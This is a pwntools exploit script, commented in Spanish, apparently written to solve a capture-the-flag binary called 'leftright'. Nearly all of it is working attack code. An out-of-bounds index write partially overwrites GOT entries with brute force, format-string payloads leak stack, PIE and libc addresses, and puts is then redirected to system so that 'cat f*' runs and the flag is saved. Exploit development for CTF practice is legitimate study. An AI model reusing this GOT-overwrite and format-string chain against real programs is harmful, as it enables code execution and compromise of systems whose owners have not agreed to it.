from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
c
'''.format(**locals())

'''
b *(main +21)
b *(main + 87) despues de fgets()
b *(main +412) stackcheck
b *(main +156) getchar()
rbp-0x2e
'''

exe = './leftright_patched'
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'info'


class Chall:
    def __init__(self, name: bytes = b"/bin/sh\x00"):
        self.io = start()
        self.i = 0
        self.max_pos_i = 32767
        self.io.sendlineafter(b"Name:", name)
    
    def i2b(self, val: int):
        return str(val).encode()
    
    def trigger_exit(self):
        self.io.sendline(self.i2b(3))
    
    def _add_self_i(self, val: int):
        if self.i == 0 and val < 0:
            #cuando ya he sobreescrito exit no cambio su valor para no explotar
            return

        self.i += val
        if self.i > self.max_pos_i:
            self.i *= -1

    def increase_i(self):
        self.io.sendline(self.i2b(1))
        self.io.sendline()
        self._add_self_i(1)
        self.io.clean(0.00005)

    def set_i(self, val: int):
        print(f"Setting i to {hex(val)}")

        num_it = val - self.i
        if num_it < 0:
            num_it = (0xFFFF + num_it) + 1

        for _ in range(num_it):
            self.increase_i()
            print(f"\ri: {hex(self.i)}", end="")

        print("\n")
        
    def write_at_arr(self, val: bytes):
        for i in range(len(val)):
            self.io.sendline(self.i2b(2))
            self.io.sendline(p8(val[i]))
            self.increase_i()
            self.io.clean(0.00005)
    
    def write_at_arr_offset(self, offset: int, val: bytes):
        self.set_i(offset)
        self.write_at_arr(val)
    
    def set_puente(self):
        self.write_at_arr_offset(-0x78, p8(0x70)) # puts -> printf
        self.write_at_arr_offset(-0x70, p16(0x51ca)) # stackchck -> main + 0x11. Este bruteforcea 1/16
        self.write_at_arr_offset(-0x40, p16(0x5380)) # exit -> call stackcheck. Este bruteforcea 1/16 (si este funciona stackchk tb)

        self.set_i(0)
        self.io.sendline(self.i2b(0)) # decrease i

        self.io.sendlineafter(b"Name:", b"%p"*7)

    def change_puente(self):
        self.write_at_arr_offset(-0x70, p16(0x5297)) # stackchck -> exit. 
        self.write_at_arr_offset(-0x40, p16(0x51ca)) # exit -> main.

    def leak_stack_pie(self):
        self.trigger_exit() # exit
        leaked = self.io.recvuntil(b"Name").split(b"0x")

        rbp_leak = int(leaked[1].replace(b"(nil)", b""), 16) + 0x2160 #offset to main's rbp
        main_base = int(leaked[5], 16) - 0x1cc

        log.success(f"Stack leaked: {hex(rbp_leak)}")
        log.success(f"Main base: {hex(main_base)}")

        return (rbp_leak, main_base)
    
    def leak_libc(self):
        chall.io.sendlineafter(b":", b"Basura")

        chall.trigger_exit()
        chall.io.recvuntil(b"Name").split(b"\n")
        chall.io.sendlineafter(b":", b"%19$p")

        chall.trigger_exit()
        leaked2 = chall.io.recvuntil(b"Name").split(b"\n")
        chall.io.sendlineafter(b":", b"cat f*\x00")

        libc_leak = int(leaked2[1].replace(b"bye", b""), 16)
        libc_leak -= 0x29d90

        log.success(f"Libc leak: {hex(libc_leak)}")

        return libc_leak


if __name__ == "__main__":
    while True:
        chall = Chall()
        try:
            chall.set_puente()
            pause()
            chall.change_puente()
            pause()
            rbp_leak, main_base = chall.leak_stack_pie()

            elf.address = main_base - 0x11b9 

            libc.address = chall.leak_libc()

            chall.write_at_arr_offset(-0xb6, p64(libc.sym['system'])[:6]) # puts = system; por alguna puta razon esta desalineado, por eso el offset es distinto
            chall.trigger_exit()

            output = chall.io.recvall(timeout=2)
            f = open("chall_flag.txt", "a")
            f.write(output.decode())
            chall.io.close()
            break
        except EOFError:
            continue
        except KeyboardInterrupt:
            exit()
        finally:
            chall.io.close()
